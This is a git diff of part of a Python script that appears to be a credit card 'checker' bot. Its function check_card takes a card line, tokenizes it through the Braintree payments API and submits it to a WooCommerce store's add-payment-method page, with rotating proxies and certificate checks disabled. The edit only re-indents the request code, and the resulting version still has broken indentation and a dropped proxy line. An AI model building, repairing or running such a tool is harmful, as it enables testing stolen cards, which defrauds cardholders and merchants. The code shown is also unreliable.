@@ -381,18 +381,17 @@ def check_card(cc_line):
             'user-agent': user
         }
 
-        proxy = get_random_proxy()
+       proxy = get_random_proxy()
         try:
-         response = requests.post(
-          'https://payments.braintree-api.com/graphql',
-           headers=headers_token,
-           json=json_data,
-           proxies=proxy,
-        verify=False
-    )
-except requests.exceptions.SSLError:
-    return "❌ SSL Error: Secure connection failed. Please try again."
-
+            response = requests.post(
+                'https://payments.braintree-api.com/graphql',
+                headers=headers_token,
+                json=json_data,
+                proxies=proxy,
+                verify=False
+            )
+        except requests.exceptions.SSLError:
+            return "❌ SSL Error: Secure connection failed. Please try again."
         if response.status_code != 200:
             return f"❌ Tokenization failed. Status: {response.status_code}"
 
@@ -410,18 +409,18 @@ except requests.exceptions.SSLError:
             'woocommerce_add_payment_method': '1',
         }
 
-        proxy = get_random_proxy()
-       try:
-    response = requests.post(
-        f'{domain_url}/my-account/add-payment-method/',
-        cookies=cookies_2,
-        headers=headers,
-        data=data,
-        proxies=proxy,
-        verify=False
-    )
-except requests.exceptions.SSLError:
-    return "❌ SSL Error: Unable to reach the server securely."
+                try:
+            response = requests.post(
+                f'{domain_url}/my-account/add-payment-method/',
+                cookies=cookies_2,
+                headers=headers,
+                data=data,
+                proxies=proxy,
+                verify=False
+            )
+        except requests.exceptions.SSLError:
+            return "❌ SSL Error: Unable to reach the server securely."
+
 
         elapsed_time = time.time() - start_time
         soup = BeautifulSoup(response.text, 'html.parser')
@@ -677,6 +676,7 @@ Bot By: @mhitzxg
     time.sleep(2)
 
 file.close()
+
 
 
 
